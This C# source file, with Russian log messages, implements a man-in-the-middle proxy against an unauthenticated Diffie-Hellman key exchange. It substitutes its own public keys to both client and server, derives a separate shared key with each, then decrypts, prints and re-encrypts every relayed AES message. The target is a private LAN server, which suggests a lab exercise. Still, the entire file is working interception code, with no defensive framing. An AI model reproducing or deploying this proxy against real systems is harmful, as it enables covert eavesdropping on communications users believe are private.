using CryptoLib;
using System.Net;
using System.Net.Sockets;
using System.Numerics;
using System.Text;
using System.Security.Cryptography;

class MITMProxy
{
    private readonly static string RealServerIP = "192.168.31.165";
    private readonly static int RealServerPort = 5000;

    static async Task Main()
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 5000);
        listener.Start();
        Console.WriteLine("[MITM] Прокси запущен...");

        while (true)
        {
            TcpClient client = await listener.AcceptTcpClientAsync();
            Console.WriteLine("[MITM] Новый клиент подключен. Открываем соединение с сервером...");

            _ = HandleClient(client);
        }
    }

    static async Task HandleClient(TcpClient client)
    {
        NetworkStream clientStream = client.GetStream();
        TcpClient server = null;
        NetworkStream serverStream = null;

        try
        {
            server = new TcpClient(RealServerIP, RealServerPort);
            serverStream = server.GetStream();
            Console.WriteLine("[MITM] Подключено к серверу.");

            DiffieHellman dhForClient = new DiffieHellman(); // Для общения с клиентом
            DiffieHellman dhForServer = new DiffieHellman(); // Для общения с сервером

            // Получаем публичный ключ клиента
            byte[] pubKeyClientBytes = await ReadBytes(clientStream);
            BigInteger Y_Client = new BigInteger(pubKeyClientBytes, isUnsigned: true, isBigEndian: true);
            Console.WriteLine($"[MITM] Получен публичный ключ клиента ({pubKeyClientBytes.Length} байт)");

            // Отправляем серверу наш публичный ключ (dhForServer)
            byte[] fakeKeyForServer = dhForServer.PublicKey.ToByteArray(isUnsigned: true, isBigEndian: true);
            await SendBytes(serverStream, fakeKeyForServer);

            // Получаем публичный ключ сервера
            byte[] pubKeyServerBytes = await ReadBytes(serverStream);
            BigInteger Y_Server = new BigInteger(pubKeyServerBytes, isUnsigned: true, isBigEndian: true);
            Console.WriteLine($"[MITM] Получен публичный ключ сервера ({pubKeyServerBytes.Length} байт)");

            // Отправляем клиенту наш публичный ключ (dhForClient)
            byte[] fakeKeyForClient = dhForClient.PublicKey.ToByteArray(isUnsigned: true, isBigEndian: true);
            await SendBytes(clientStream, fakeKeyForClient);

            // Вычисляем общие ключи
            byte[] sharedKeyWithClient = SHA256.Create().ComputeHash(dhForClient.ComputeSharedKey(Y_Client).ToByteArray(isUnsigned: true, isBigEndian: true));
            byte[] sharedKeyWithServer = SHA256.Create().ComputeHash(dhForServer.ComputeSharedKey(Y_Server).ToByteArray(isUnsigned: true, isBigEndian: true));

            Console.WriteLine($"[MITM] SharedKey с клиентом: {BitConverter.ToString(sharedKeyWithClient)}");
            Console.WriteLine($"[MITM] SharedKey с сервером: {BitConverter.ToString(sharedKeyWithServer)}");

            Console.WriteLine("[MITM] Начинаем перехват сообщений...");

            // Запускаем задачи для пересылки сообщений
            Task clientToServer = Relay(clientStream, serverStream, client, server, sharedKeyWithClient, sharedKeyWithServer, "Клиент → Сервер");
            Task serverToClient = Relay(serverStream, clientStream, server, client, sharedKeyWithServer, sharedKeyWithClient, "Сервер → Клиент");

            await Task.WhenAll(clientToServer, serverToClient);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[MITM] Ошибка: {ex.Message}");
        }
        finally
        {
            Console.WriteLine("[MITM] Клиент отключен. Закрываем соединения...");
            clientStream?.Close();
            client?.Close();
            serverStream?.Close();
            server?.Close();
        }
    }

    static async Task<byte[]> ReadBytes(NetworkStream stream)
    {
        byte[] buffer = new byte[4096];
        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

        byte[] result = new byte[bytesRead];
        Array.Copy(buffer, 0, result, 0, bytesRead);
        return result;
    }

    static async Task SendBytes(NetworkStream stream, byte[] data)
    {
        await stream.WriteAsync(data, 0, data.Length);
        await stream.FlushAsync();
    }

    static async Task Relay(NetworkStream fromStream, NetworkStream toStream, TcpClient fromClient, TcpClient toClient, byte[] keyFrom, byte[] keyTo, string direction)
    {
        byte[] buffer = new byte[4096];
        while (true)
        {
            try
            {
                int bytesRead = await fromStream.ReadAsync(buffer, 0, buffer.Length);
                if (bytesRead == 0) break;

                string base64Message = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                if (!IsBase64(base64Message))
                {
                    Console.WriteLine($"[MITM] Получено некорректное сообщение в {direction}.");
                    continue;
                }

                try
                {
                    byte[] encrypted = Convert.FromBase64String(base64Message);
                    string decrypted = AesEncryptor.Decrypt(encrypted, keyFrom);
                    Console.WriteLine($"[MITM] {direction}: {decrypted}");

                    byte[] reEncrypted = AesEncryptor.Encrypt(decrypted, keyTo);
                    string newBase64 = Convert.ToBase64String(reEncrypted);

                    byte[] outData = Encoding.UTF8.GetBytes(newBase64);
                    await toStream.WriteAsync(outData, 0, outData.Length);
                    await toStream.FlushAsync();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[MITM] Ошибка перехвата в {direction}: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[MITM] Ошибка чтения в {direction}: {ex.Message}");
                break;
            }
        }
    }

    static bool IsBase64(string str)
    {
        if (string.IsNullOrWhiteSpace(str)) return false;
        if (str.Length % 4 != 0) return false;

        try
        {
            Convert.FromBase64String(str);
            return true;
        }
        catch
        {
            return false;
        }
    }
}